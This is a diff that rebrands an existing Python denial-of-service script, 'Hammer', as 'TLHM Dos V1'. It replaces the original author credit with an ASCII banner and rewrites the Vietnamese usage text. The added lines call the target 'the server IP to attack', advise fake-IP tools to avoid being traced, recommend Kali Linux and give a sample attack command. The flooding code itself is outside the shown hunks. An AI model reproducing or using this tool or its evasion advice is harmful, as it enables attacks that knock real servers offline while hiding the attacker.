@@ -1,9 +1,4 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
-# Python 3.3.2+ Hammer DoS Script v.1
-# by Can Yalçın
-# chỉ dành cho mục đích hợp lý
+#dos atack by tlhm
 
 from queue import Queue
 from optparse import OptionParser
@@ -68,12 +63,22 @@ def dos2():
         w.task_done()
 
 def usage():
-    print (''' \033[92m	Hammer DoS Script v.1 http://www.canyalcin.com/
+    print("\033[92m______________      /\   /\    _____  ")
+    print("\033[91m\__    ___/   |    /  |_|  \  /     \ ")
+    print("\033[93m  |    |  |   |   /         \/  \ /  \ ")
+    print("\033[92m  |    |  |   |___\    _    /    \    \ ")
+    print("\033[90m  |____|  |______ \\  | |  /\____/\_  / ")
+    print("\033[95m                 \/ \/   \/         \/    ")
+    print("\n")
+    print (''' \033[92m	TLHM Dos V1 
     Người dùng cuối cùng phải tuân theo tất cả các luật pháp áp dụng.
-    Chỉ sử dụng để kiểm thử máy chủ. Địa chỉ IP của bạn có thể bị lộ. \n
-    Sử dụng : python3 hammer.py [-s] [-p] [-t]
+    Chỉ sử dụng để kiểm thử máy chủ. Địa chỉ IP của bạn có thể bị lộ. 
+    Dùng các phần mềm bảo mật fake ip các lớp để tránh bị lộ ip.
+    Khuyên dùng Kali Linux.\n
+    Sử dụng : python3 tlhm.py [-s] [-p] [-t]
+    -VD: python3 tlhm.py -s 192.168.1.100 -p 80 -t 135
     -h : trợ giúp
-    -s : địa chỉ IP của máy chủ
+    -s : địa chỉ IP của máy chủ cần tấn công
     -p : cổng, mặc định là 80
     -t : turbo, mặc định là 135 \033[0m''')
     sys.exit()
